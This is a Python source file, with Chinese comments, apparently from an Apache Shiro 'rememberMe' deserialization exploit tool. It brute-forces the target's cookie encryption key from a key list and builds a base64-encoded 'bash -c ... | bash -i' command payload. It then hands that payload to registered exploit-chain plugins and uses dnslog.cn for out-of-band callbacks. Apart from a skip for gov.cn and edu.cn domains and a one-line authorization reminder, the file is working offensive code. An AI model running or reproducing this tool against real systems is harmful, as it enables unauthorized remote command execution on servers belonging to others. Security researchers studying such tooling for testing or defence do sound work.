#!/usr/bin/env python
# _*_ coding:utf-8 _*_
import requests
import time


def scripts(url, command, mode):
    """
    尊重原作者意愿，该判断逻辑未作修改，无授权勿测试。
    """
    processor = Idea()
    if "gov.cn" in url or "edu.cn" in url:
        print("[-] 存在敏感域名，停止检测，请使用其他工具或自行手工检测,抱歉")
        return

    if mode == 'full':
        print("[*] 开始执行全部Key值和利用链,请稍等...")
        with open('data/keys.txt', 'r') as k:
            ke = k.readlines()
            for i in ke:
                x = i.strip('\n')
                y = x.split(':')
                res_key = y[0]
                print("[+] 使用key值: {}".format(res_key))
                func = processor.get_dnslog_cookie()
                print('[+] 执行命令: {} \n'.format(command))
                time.sleep(1)
                try:
                    base_command = processor.get_base64_command(command)
                    processor.process(url, base_command, res_key, func)
                except Exception as err:
                    print(err)
    else:
        print("[*] 开始检测目标使用的Key值,请稍等...")
        res_key = processor.find_target_key(url)
        if res_key:
            print("[+] 目标使用key值: {}".format(res_key))
            func = processor.get_dnslog_cookie()
            dnslog = func[0]
            print('[+] 执行命令: {} \n'.format(command))
            time.sleep(1)
            try:
                base_command = processor.get_base64_command(command)
                processor.process(url, base_command, res_key, func)
            except Exception as err:
                print(err)
        else:
            print("[-] 很遗憾没有找到目标使用的key")


class Idea(object):
    PLUGINS = {}

    def process(self, url, command, res_key, func, plugins=()):
        if plugins is ():
            for plugin_name in self.PLUGINS.keys():
                try:
                    print("[*]开始检测模块", plugin_name)
                    self.PLUGINS[plugin_name]().process(
                        url, command, res_key, func
                    )
                except Exception as err:
                    print(err)
                    print("[-]{}检测失败，请检查网络连接或目标是否存活".format(plugin_name))
        else:
            for plugin_name in plugins:
                try:
                    print("[*]开始检测 ", self.PLUGINS[plugin_name])
                    self.PLUGINS[plugin_name]().process(url, command, 20,
                                                        res_key, func)
                except Exception as err:
                    print(err)
                    print("[-]{}检测失败，请检查网络连接或目标是否存活".format(
                        self.PLUGINS[plugin_name]))
        print("[+] 检测完毕!")
        return

    def find_target_key(self, url):
        with open('data/keys.txt', 'r') as k:
            ke = k.readlines()
            for i in ke:
                x = i.strip('\n')
                y = x.split(':')
                key = y[0]
                key_cookie = y[1]
                header = {
                    'User-agent': ('Mozilla/5.0 (Windows NT 6.2; WOW64; '
                                   'rv:22.0) Gecko/20100101 Firefox/22.0;'),
                    'Cookie': 'rememberMe={}'.format(key_cookie)
                }
                res = requests.post(url, headers=header, verify=False,
                                    timeout=30)
                if 'rememberMe' not in str(res.headers):
                    return key
                else:
                    continue
            return False

    def get_dnslog_cookie(self):
        import requests
        dnslog = "http://dnslog.cn/getdomain.php"
        res = requests.get(dnslog, timeout=10)
        dnslog_url = res.text
        cookie = res.cookies
        phpsessid = cookie['PHPSESSID']
        return dnslog_url, phpsessid

    def get_base64_command(self, command):
        import base64
        base1 = str(base64.b64encode(str(command).encode(encoding='utf-8')))
        base2 = base1.replace("b'", "")
        base3 = base2.replace("'", "")
        payload = "bash -c {echo," + str(base3) + '}|{base64,-d}|{bash,-i}'
        return payload

    @classmethod
    def plugin_register(cls, plugin_name):
        def wrapper(plugin):
            cls.PLUGINS.update({plugin_name: plugin})
            return plugin

        return wrapper